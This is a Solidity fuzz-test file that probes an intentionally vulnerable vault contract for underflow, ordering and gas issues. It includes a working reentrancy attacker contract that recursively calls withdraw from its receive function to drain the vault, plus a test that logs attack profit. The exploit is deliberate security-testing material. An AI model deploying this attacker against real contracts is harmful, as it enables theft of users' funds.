// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {UnsafeVault, ReentrancyAttacker} from "../Vault.sol";

/**
 * @title VaultFuzzingTest
 * @notice Property-based fuzzing tests for comprehensive vulnerability discovery
 * Uses Foundry's fuzzing capabilities to automatically discover edge cases
 * and unexpected vulnerability combinations that manual testing might miss
 */
contract VaultFuzzingTest is Test {
    UnsafeVault public vault;
    
    address public constant USER1 = address(1);
    address public constant USER2 = address(2);
    address public constant ATTACKER = address(0x1337);
    
    function setUp() public {
        vault = new UnsafeVault();
        
        // Fund test addresses
        vm.deal(USER1, 1000 ether);
        vm.deal(USER2, 1000 ether);
        vm.deal(ATTACKER, 1000 ether);
    }

    /*//////////////////////////////////////////////////////////////
                        PROPERTY-BASED FUZZING TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Fuzz test: Contract balance should always equal sum of user balances
     * This property should hold unless vulnerabilities are exploited
     */
    function testFuzz_BalanceInvariant(uint256 deposit1, uint256 deposit2) public {
        // Bound inputs to reasonable values
        deposit1 = bound(deposit1, 1 wei, 100 ether);
        deposit2 = bound(deposit2, 1 wei, 100 ether);
        
        // Normal deposits
        vm.prank(USER1);
        vault.deposit{value: deposit1}();
        
        vm.prank(USER2);
        vault.deposit{value: deposit2}();
        
        // Check invariant holds for normal operations
        uint256 contractBalance = vault.getBalance();
        uint256 totalUserBalance = vault.totalVaultBalance();
        
        assertEq(contractBalance, totalUserBalance, "Balance invariant violated in normal operation");
    }

    /**
     * @notice Fuzz test: Withdrawal amount bounds testing
     * Tests various withdrawal amounts to find edge cases
     */
    function testFuzz_WithdrawalBounds(uint256 depositAmount, uint256 withdrawAmount) public {
        depositAmount = bound(depositAmount, 1 wei, 100 ether);
        withdrawAmount = bound(withdrawAmount, 0, type(uint128).max);
        
        // Setup: User deposits funds
        vm.startPrank(USER1);
        vault.deposit{value: depositAmount}();
        
        if (withdrawAmount <= depositAmount) {
            // Valid withdrawal should succeed
            uint256 balanceBefore = vault.balances(USER1);
            vault.withdraw(withdrawAmount);
            uint256 balanceAfter = vault.balances(USER1);
            
            // Check if underflow occurred (vulnerability detection)
            if (balanceAfter > balanceBefore) {
                // Underflow detected!
                console.log("FUZZ FOUND VULNERABILITY: Underflow detected");
                console.log("Deposit amount:", depositAmount);
                console.log("Withdraw amount:", withdrawAmount);
                console.log("Balance before:", balanceBefore);
                console.log("Balance after:", balanceAfter);
                
                // This is expected due to the unchecked block
                assertTrue(balanceAfter > type(uint256).max - 1000 ether, "Underflow should wrap to large number");
            } else {
                assertEq(balanceAfter, balanceBefore - withdrawAmount, "Normal withdrawal should work correctly");
            }
        } else {
            // Invalid withdrawal should revert
            vm.expectRevert("Insufficient balance");
            vault.withdraw(withdrawAmount);
        }
        
        vm.stopPrank();
    }

    /**
     * @notice Fuzz test: Multiple user interaction scenarios
     * Tests complex multi-user scenarios to find race conditions
     */
    function testFuzz_MultiUserScenarios(
        uint256 deposit1,
        uint256 deposit2,
        uint256 withdraw1,
        uint256 withdraw2,
        bool user1First
    ) public {
        deposit1 = bound(deposit1, 1 wei, 50 ether);
        deposit2 = bound(deposit2, 1 wei, 50 ether);
        withdraw1 = bound(withdraw1, 0, deposit1);
        withdraw2 = bound(withdraw2, 0, deposit2);
        
        // Both users deposit
        vm.prank(USER1);
        vault.deposit{value: deposit1}();
        
        vm.prank(USER2);
        vault.deposit{value: deposit2}();
        
        uint256 totalVaultBefore = vault.getBalance();
        
        // Execute withdrawals in random order
        if (user1First) {
            vm.prank(USER1);
            vault.withdraw(withdraw1);
            
            vm.prank(USER2);
            vault.withdraw(withdraw2);
        } else {
            vm.prank(USER2);
            vault.withdraw(withdraw2);
            
            vm.prank(USER1);
            vault.withdraw(withdraw1);
        }
        
        uint256 totalVaultAfter = vault.getBalance();
        uint256 expectedVaultBalance = totalVaultBefore - withdraw1 - withdraw2;
        
        // Check if the order of operations affects final state
        assertEq(totalVaultAfter, expectedVaultBalance, "Multi-user withdrawal order should not affect final state");
    }

    /**
     * @notice Fuzz test: Reentrancy attack with random parameters
     * Discovers optimal attack parameters through fuzzing
     */
    function testFuzz_ReentrancyAttackOptimization(
        uint256 victimDeposits,
        uint256 attackerDeposit,
        uint256 attackAmount
    ) public {
        victimDeposits = bound(victimDeposits, 10 ether, 100 ether);
        attackerDeposit = bound(attackerDeposit, 1 wei, 10 ether);
        attackAmount = bound(attackAmount, 1 wei, attackerDeposit);
        
        // Setup victim funds
        vm.prank(USER1);
        vault.deposit{value: victimDeposits}();
        
        // Deploy and fund attacker
        FuzzReentrancyAttacker attacker = new FuzzReentrancyAttacker(address(vault));
        vm.deal(address(attacker), attackerDeposit);
        
        // Execute attack with fuzzing parameters
        attacker.setupAttack{value: attackerDeposit}();
        
        uint256 vaultBalanceBefore = vault.getBalance();
        attacker.attack(attackAmount);
        uint256 vaultBalanceAfter = vault.getBalance();
        
        uint256 fundsExtracted = vaultBalanceBefore - vaultBalanceAfter;
        uint256 attackerProfit = attacker.getBalance();
        
        // Log successful attack parameters for analysis
        if (attackerProfit > attackerDeposit) {
            console.log("PROFITABLE ATTACK FOUND:");
            console.log("Victim deposits:", victimDeposits);
            console.log("Attacker initial capital:", attackerDeposit);
            console.log("Attack amount:", attackAmount);
            console.log("Funds extracted:", fundsExtracted);
            console.log("Attacker profit:", attackerProfit - attackerDeposit);
            console.log("ROI:", ((attackerProfit - attackerDeposit) * 100) / attackerDeposit);
        }
    }

    /**
     * @notice Fuzz test: Gas manipulation scenarios
     * Tests how different gas limits affect attack success
     */
    function testFuzz_GasManipulation(
        uint256 depositAmount,
        uint256 gasLimit,
        uint256 gasPrice
    ) public {
        depositAmount = bound(depositAmount, 1 ether, 10 ether);
        gasLimit = bound(gasLimit, 21000, 500000);
        gasPrice = bound(gasPrice, 1 gwei, 100 gwei);
        
        // Setup
        vm.prank(USER1);
        vault.deposit{value: depositAmount}();
        
        FuzzGasAttacker gasAttacker = new FuzzGasAttacker(address(vault));
        vm.deal(address(gasAttacker), 2 ether);
        
        vm.prank(address(gasAttacker));
        vault.deposit{value: 1 ether}();
        
        // Test withdrawal with specific gas constraints
        vm.txGasPrice(gasPrice);
        
        try gasAttacker.attemptWithdrawal{gas: gasLimit}(1 ether) {
            // Withdrawal succeeded
            console.log("Withdrawal succeeded with gas limit:", gasLimit);
        } catch {
            // Withdrawal failed due to gas constraints
            console.log("Withdrawal failed with gas limit:", gasLimit);
        }
    }

    /*//////////////////////////////////////////////////////////////
                        SEQUENCE FUZZING TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Fuzz test: Random sequence of operations
     * Tests unexpected operation sequences that might reveal vulnerabilities
     */
    function testFuzz_RandomOperationSequence(bytes memory operations) public {
        // Interpret bytes as sequence of operations
        if (operations.length == 0) return;
        
        uint256 userBalance = 100 ether;
        vm.deal(USER1, userBalance);
        
        for (uint256 i = 0; i < operations.length && i < 20; i++) {
            uint8 operation = uint8(operations[i]);
            
            // Decode operation type from byte value
            if (operation < 128) {
                // Deposit operation
                uint256 amount = (uint256(operation) * 1 ether) / 128;
                if (amount > 0 && amount <= USER1.balance) {
                    vm.prank(USER1);
                    vault.deposit{value: amount}();
                }
            } else {
                // Withdraw operation
                uint256 amount = ((uint256(operation) - 128) * vault.balances(USER1)) / 128;
                if (amount > 0) {
                    vm.prank(USER1);
                    try vault.withdraw(amount) {
                        // Withdrawal succeeded
                    } catch {
                        // Withdrawal failed (expected for invalid amounts)
                    }
                }
            }
        }
        
        // Check final state consistency
        uint256 contractBalance = vault.getBalance();
        uint256 accountedBalance = vault.totalVaultBalance();
        
        // Log any inconsistencies found
        if (contractBalance != accountedBalance) {
            console.log("FUZZ FOUND INCONSISTENCY:");
            console.log("Contract balance:", contractBalance);
            console.log("Accounted balance:", accountedBalance);
            console.log("Operation sequence length:", operations.length);
        }
    }

    /*//////////////////////////////////////////////////////////////
                        BOUNDARY VALUE FUZZING
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Fuzz test: Extreme value testing
     * Tests behavior at uint256 boundaries and edge cases
     */
    function testFuzz_ExtremeValues(uint256 value) public {
        // Test various extreme values
        if (value == 0) {
            // Zero value operations
            vm.expectRevert("Deposit must be greater than zero");
            vm.prank(USER1);
            vault.deposit{value: 0}();
        } else if (value == type(uint256).max) {
            // Maximum value operations (should fail due to insufficient balance)
            vm.expectRevert();
            vm.prank(USER1);
            vault.deposit{value: value}();
        } else if (value == 1) {
            // Minimum valid value
            vm.prank(USER1);
            vault.deposit{value: 1 wei}();
            
            assertEq(vault.balances(USER1), 1 wei, "Minimum deposit should work");
        } else if (value < 1000 ether) {
            // Normal range testing
            vm.deal(USER1, value);
            vm.prank(USER1);
            vault.deposit{value: value}();
            
            assertEq(vault.balances(USER1), value, "Normal deposit should work");
        }
    }

    /*//////////////////////////////////////////////////////////////
                        TIME-BASED FUZZING
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Fuzz test: Time manipulation scenarios
     * Tests if time-dependent vulnerabilities exist
     */
    function testFuzz_TimeManipulation(uint256 timeOffset, uint256 blockNumber) public {
        timeOffset = bound(timeOffset, 1, 365 days);
        blockNumber = bound(blockNumber, block.number, block.number + 1000000);
        
        // Manipulate blockchain time
        vm.warp(block.timestamp + timeOffset);
        vm.roll(blockNumber);
        
        // Test if time manipulation affects contract behavior
        vm.prank(USER1);
        vault.deposit{value: 1 ether}();
        
        uint256 balanceBefore = vault.balances(USER1);
        
        vm.prank(USER1);
        vault.withdraw(1 ether);
        
        uint256 balanceAfter = vault.balances(USER1);
        
        // Time manipulation should not affect basic operations
        assertEq(balanceAfter, balanceBefore - 1 ether, "Time manipulation should not affect basic operations");
    }
}

/*//////////////////////////////////////////////////////////////
                        FUZZING HELPER CONTRACTS
//////////////////////////////////////////////////////////////*/

/**
 * @title FuzzReentrancyAttacker
 * @notice Fuzzing-friendly reentrancy attacker with configurable parameters
 */
contract FuzzReentrancyAttacker {
    UnsafeVault public vault;
    uint256 public attackAmount;
    uint256 public maxDepth;
    uint256 public currentDepth;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
        maxDepth = 10; // Prevent infinite recursion in tests
    }
    
    function setupAttack() external payable {
        vault.deposit{value: msg.value}();
    }
    
    function attack(uint256 _attackAmount) external {
        attackAmount = _attackAmount;
        currentDepth = 0;
        vault.withdraw(attackAmount);
    }
    
    receive() external payable {
        currentDepth++;
        if (currentDepth < maxDepth && address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title FuzzGasAttacker
 * @notice Gas-focused attacker for fuzzing gas-related vulnerabilities
 */
contract FuzzGasAttacker {
    UnsafeVault public vault;
    uint256 public gasWasteLevel;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
        gasWasteLevel = 1000; // Default gas waste operations
    }
    
    function attemptWithdrawal(uint256 amount) external {
        vault.withdraw(amount);
    }
    
    function setGasWasteLevel(uint256 level) external {
        gasWasteLevel = level;
    }
    
    receive() external payable {
        // Waste gas based on fuzzing parameter
        uint256 dummy;
        for (uint256 i = 0; i < gasWasteLevel; i++) {
            dummy += i * block.timestamp;
        }
    }
}